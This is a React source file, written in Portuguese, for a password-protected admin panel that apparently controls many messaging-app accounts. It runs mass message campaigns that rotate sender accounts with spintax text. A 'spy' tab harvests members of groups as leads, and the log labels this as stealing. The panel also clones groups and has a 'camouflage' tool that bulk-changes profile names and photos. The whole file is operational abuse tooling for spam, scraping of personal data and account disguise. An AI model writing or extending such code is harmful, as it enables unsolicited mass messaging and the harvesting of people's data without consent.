import { useState, useEffect } from 'react';

export default function AdminPanel() {
  // --- ESTADO DE LOGIN ---
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [passwordInput, setPasswordInput] = useState('');
  const [loginError, setLoginError] = useState('');

  // --- ESTADOS DO SISTEMA ---
  const [tab, setTab] = useState('dashboard'); 
  const [sessions, setSessions] = useState([]);
  const [stats, setStats] = useState({ total: 0, pending: 0, sent: 0 });
  const [logs, setLogs] = useState([]);
  const [selectedPhones, setSelectedPhones] = useState(new Set());
  const [processing, setProcessing] = useState(false);

  // Estados CRM
  const [msg, setMsg] = useState('{Olá|Oi}, tudo bem?');
  
  // Estados Spy
  const [spyPhone, setSpyPhone] = useState('');
  const [chats, setChats] = useState([]);
  const [loadingChats, setLoadingChats] = useState(false);

  // Estados Tools
  const [newName, setNewName] = useState('');
  const [photoUrl, setPhotoUrl] = useState('');
  const [storyUrl, setStoryUrl] = useState('');
  const [storyCaption, setStoryCaption] = useState('');

  // --- LOGIN ---
  const handleLogin = async (e) => {
    e.preventDefault();
    setLoginError('');
    try {
      const res = await fetch('/api/admin-login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ password: passwordInput }),
      });
      const data = await res.json();
      if (res.ok && data.success) {
        setIsAuthenticated(true);
        fetchData(); 
      } else {
        setLoginError('Acesso Negado.');
      }
    } catch (error) { setLoginError('Erro de conexão.'); }
  };

  // --- DADOS ---
  const fetchData = async () => {
    try {
      const sRes = await fetch('/api/list-sessions');
      const sData = await sRes.json();
      setSessions(sData.sessions || []);
      const stRes = await fetch('/api/stats');
      if (stRes.ok) setStats(await stRes.json());
    } catch (e) { console.error(e); }
  };

  useEffect(() => {
      if(isAuthenticated) fetchData();
  }, [isAuthenticated]);

  const addLog = (text) => setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${text}`, ...prev]);
  
  const toggleSelect = (phone) => {
    const newSet = new Set(selectedPhones);
    if (newSet.has(phone)) newSet.delete(phone); else newSet.add(phone);
    setSelectedPhones(newSet);
  };

  // --- DELETE ---
  const handleDelete = async (phone) => {
      if (!confirm(`Apagar ${phone}?`)) return;
      try {
          const res = await fetch('/api/delete-session', {
              method: 'POST',
              headers: {'Content-Type': 'application/json'},
              body: JSON.stringify({ phone })
          });
          if (res.ok) {
              addLog(`🗑️ Conta ${phone} removida.`);
              setSessions(prev => prev.filter(s => s.phone_number !== phone));
              if (selectedPhones.has(phone)) toggleSelect(phone);
              if (spyPhone === phone) { setSpyPhone(''); setChats([]); }
          }
      } catch (e) { addLog(`❌ Erro ao deletar.`); }
  };

  // --- ACTIONS ---
  const startRealCampaign = async () => {
     if (selectedPhones.size === 0) return alert('Selecione contas!');
     setProcessing(true);
     addLog('Iniciando...');
     try {
         const res = await fetch('/api/get-campaign-leads'); 
         const data = await res.json();
         const leads = data.leads || [];
         if (leads.length === 0) { setProcessing(false); return alert('Sem leads pendentes!'); }
         const phones = Array.from(selectedPhones);
         for (let i = 0; i < leads.length; i++) {
             const sender = phones[i % phones.length];
             addLog(`[${i+1}/${leads.length}] ${sender} > ${leads[i].user_id}`);
             await fetch('/api/dispatch', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ senderPhone: sender, target: leads[i].user_id, message: msg, leadDbId: leads[i].id })
             });
             await new Promise(r => setTimeout(r, 1500)); 
         }
         addLog('✅ Fim.'); fetchData();
     } catch (e) { addLog(`Erro: ${e.message}`); }
     setProcessing(false);
  };

  const loadChats = async (phone) => {
    setSpyPhone(phone); setLoadingChats(true);
    try {
        const res = await fetch('/api/spy/list-chats', { method: 'POST', body: JSON.stringify({ phone }), headers: {'Content-Type': 'application/json'} });
        const data = await res.json(); setChats(data.chats || []);
    } catch (e) {}
    setLoadingChats(false);
  };

  const handleHarvest = async (chatId, title) => {
      addLog(`🕷️ Roubando ${title}...`);
      await fetch('/api/spy/harvest', { method: 'POST', body: JSON.stringify({ phone: spyPhone, chatId, chatName: title }), headers: {'Content-Type': 'application/json'} });
      addLog('✅ Leads salvos.'); fetchData();
  };

  const handleCloneGroup = async (chatId, title) => {
    addLog(`🐑 Clonando...`);
    const res = await fetch('/api/spy/clone-group', { method: 'POST', body: JSON.stringify({ phone: spyPhone, originalChatId: chatId, originalTitle: title }), headers: {'Content-Type': 'application/json'} });
    if(res.ok) addLog('✅ Grupo criado.'); else addLog('❌ Erro.');
  };

  const handleUpdateProfile = async () => {
      if (selectedPhones.size === 0) return alert('Selecione contas!');
      setProcessing(true);
      for (const phone of Array.from(selectedPhones)) {
          addLog(`🎭 Atualizando ${phone}...`);
          await fetch('/api/update-profile', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ phone, newName, photoUrl }) });
      }
      setProcessing(false); addLog('✅ Feito.');
  };

  const handlePostStory = async () => {
      if (selectedPhones.size === 0) return alert('Selecione contas!');
      setProcessing(true);
      for (const phone of Array.from(selectedPhones)) {
          addLog(`📸 Story em ${phone}...`);
          await fetch('/api/post-story', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ phone, mediaUrl: storyUrl, caption: storyCaption }) });
      }
      setProcessing(false); addLog('✅ Feito.');
  };

  // --- RENDER ---
  if (!isAuthenticated) {
    return (
      <div style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', backgroundColor: '#0d1117', fontFamily: 'monospace' }}>
        <form onSubmit={handleLogin} style={{ background: '#161b22', padding: '40px', borderRadius: '10px', border: '1px solid #30363d', textAlign: 'center', width: '300px' }}>
            <h2 style={{ color: '#fff', marginTop: 0 }}>🔒 ACESSO RESTRITO</h2>
            <input type="password" placeholder="Senha" value={passwordInput} onChange={e => setPasswordInput(e.target.value)} style={{ width: '100%', padding: '10px', margin: '20px 0', background: '#0d1117', border: '1px solid #30363d', color: '#fff', borderRadius: '5px' }} autoFocus />
            <button type="submit" style={{ width: '100%', padding: '10px', background: '#238636', color: '#fff', border: 'none', cursor: 'pointer', fontWeight: 'bold' }}>ENTRAR</button>
            {loginError && <p style={{ color: '#ff5c5c', marginTop: '15px' }}>{loginError}</p>}
        </form>
      </div>
    );
  }

  return (
    <div style={{ backgroundColor: '#0d1117', color: '#c9d1d9', minHeight: '100vh', padding: '20px', fontFamily: 'monospace' }}>
      
      {/* Top Bar */}
      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: '10px', marginBottom: '20px' }}>
          <div style={{ background: '#161b22', padding: '15px', borderRadius: '6px', textAlign: 'center', border: '1px solid #30363d' }}>
              <div style={{ fontSize: '20px', color: '#fff' }}>{stats.total}</div>
              <div style={{ fontSize: '10px', color: '#8b949e' }}>LEADS TOTAIS</div>
          </div>
          <div style={{ background: '#161b22', padding: '15px', borderRadius: '6px', textAlign: 'center', border: '1px solid #d29922' }}>
              <div style={{ fontSize: '20px', color: '#d29922' }}>{stats.pending}</div>
              <div style={{ fontSize: '10px', color: '#8b949e' }}>PENDENTES</div>
          </div>
          <div style={{ background: '#161b22', padding: '15px', borderRadius: '6px', textAlign: 'center', border: '1px solid #238636' }}>
              <div style={{ fontSize: '20px', color: '#238636' }}>{stats.sent}</div>
              <div style={{ fontSize: '10px', color: '#8b949e' }}>ENVIADOS</div>
          </div>
      </div>

      <div style={{ marginBottom: '20px', borderBottom: '1px solid #30363d' }}>
        <button onClick={() => setTab('dashboard')} style={{ padding: '10px 20px', background: tab === 'dashboard' ? '#238636' : 'transparent', border: 'none', color: 'white', cursor: 'pointer' }}>🚀 CRM</button>
        <button onClick={() => setTab('spy')} style={{ padding: '10px 20px', background: tab === 'spy' ? '#8957e5' : 'transparent', border: 'none', color: 'white', cursor: 'pointer' }}>🕵️ Espião</button>
        <button onClick={() => setTab('tools')} style={{ padding: '10px 20px', background: tab === 'tools' ? '#1f6feb' : 'transparent', border: 'none', color: 'white', cursor: 'pointer' }}>🛠️ Ferramentas</button>
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: '2fr 1fr', gap: '20px' }}>
        
        {/* Esquerda */}
        <div>
            {tab === 'dashboard' && (
                <div style={{ backgroundColor: '#161b22', padding: '20px', borderRadius: '6px' }}>
                    <h3>Disparo em Massa</h3>
                    <textarea value={msg} onChange={e => setMsg(e.target.value)} style={{ width: '100%', height: '80px', margin: '10px 0', background: '#0d1117', border: '1px solid #30363d', color: '#fff', padding: '10px' }} />
                    <button onClick={startRealCampaign} disabled={processing} style={{ width: '100%', padding: '15px', background: '#238636', color: 'white', border: 'none', fontWeight: 'bold' }}>{processing ? 'ENVIANDO...' : '▶️ DISPARAR PARA PENDENTES'}</button>
                </div>
            )}

            {tab === 'spy' && (
                <div style={{ backgroundColor: '#161b22', padding: '20px', borderRadius: '6px' }}>
                     {!spyPhone ? <p>Selecione uma conta &gt;&gt;</p> : (
                        <div>
                            <h4>Grupos de {spyPhone}</h4>
                            {loadingChats && <p>Carregando...</p>}
                            <div style={{maxHeight: '400px', overflowY: 'auto'}}>
                                {chats.map(c => (
                                    <div key={c.id} style={{ borderBottom: '1px solid #30363d', padding: '10px', display: 'flex', justifyContent: 'space-between' }}>
                                        <span>{c.title}</span>
                                        <div>
                                            <button onClick={() => handleHarvest(c.id, c.title)} style={{ marginRight: '5px', background: '#d29922', border: 'none' }}>🕷️</button>
                                            <button onClick={() => handleCloneGroup(c.id, c.title)} style={{ background: '#1f6feb', border: 'none' }}>🐑</button>
                                        </div>
                                    </div>
                                ))}
                            </div>
                        </div>
                     )}
                </div>
            )}

            {tab === 'tools' && (
                <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
                    <div style={{ backgroundColor: '#161b22', padding: '20px', borderRadius: '6px' }}>
                        <h3>🎭 Camuflagem</h3>
                        <input type="text" placeholder="Nome" value={newName} onChange={e => setNewName(e.target.value)} style={{ width: '100%', marginBottom: '10px', padding: '10px', background: '#0d1117', border: '1px solid #30363d', color: 'white' }} />
                        <input type="text" placeholder="Foto URL" value={photoUrl} onChange={e => setPhotoUrl(e.target.value)} style={{ width: '100%', marginBottom: '10px', padding: '10px', background: '#0d1117', border: '1px solid #30363d', color: 'white' }} />
                        <button onClick={handleUpdateProfile} style={{ width: '100%', padding: '10px', background: '#8957e5', color: 'white', border: 'none' }}>ATUALIZAR</button>
                    </div>
                    <div style={{ backgroundColor: '#161b22', padding: '20px', borderRadius: '6px' }}>
                        <h3>📸 Story</h3>
                        <input type="text" placeholder="Mídia URL" value={storyUrl} onChange={e => setStoryUrl(e.target.value)} style={{ width: '100%', marginBottom: '10px', padding: '10px', background: '#0d1117', border: '1px solid #30363d', color: 'white' }} />
                        <button onClick={handlePostStory} style={{ width: '100%', padding: '10px', background: '#1f6feb', color: 'white', border: 'none' }}>POSTAR</button>
                    </div>
                </div>
            )}
            
            <div style={{ marginTop: '20px', background: '#000', padding: '10px', height: '200px', overflowY: 'auto' }}>
                {logs.map((l, i) => <div key={i}>{l}</div>)}
            </div>
        </div>

        {/* Direita */}
        <div style={{ backgroundColor: '#161b22', padding: '20px', borderRadius: '6px' }}>
            <h3>Contas ({sessions.length})</h3>
            {sessions.map(s => (
                <div key={s.id} style={{ display: 'flex', justifyContent: 'space-between', padding: '10px', borderBottom: '1px solid #30363d' }}>
                    <span>{s.phone_number}</span>
                    <div>
                        <button onClick={() => toggleSelect(s.phone_number)} style={{ marginRight: '5px' }}>{selectedPhones.has(s.phone_number) ? '✓' : '+'}</button>
                        <button onClick={() => handleDelete(s.phone_number)} style={{ background: '#ff5c5c', border: 'none' }}>🗑️</button>
                    </div>
                </div>
            ))}
        </div>

      </div>
    </div>
  );
}
